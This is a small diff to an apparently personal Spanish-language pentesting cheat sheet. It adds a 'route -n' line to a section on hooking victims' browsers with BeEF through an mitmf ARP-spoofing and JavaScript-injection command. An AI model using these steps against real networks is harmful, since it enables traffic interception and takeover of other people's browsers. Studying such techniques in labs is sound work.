@@ -612,6 +612,7 @@ rmdir <nombre directorio> (Borrar directorio)
 
 ++ Exploit de navegadores usando Beef (método alternativo: Man in the Middle Framework)
 --- mitmf --arp --spoof --gateway <router_gateway> --target <ip_víctima> -i <interface_ejemplo_eth0 --inject --js-url>
+--- route -n (Nos permite saber el gateway del router)
 --- Tomar el hook URL generado
 --- Ir a la pc de la víctima e ingresar a un sitio web
 --- Ir a la interfaz web de beef y en la sección de hooked browsers se nos mostrará la ip del equipo de la víctima
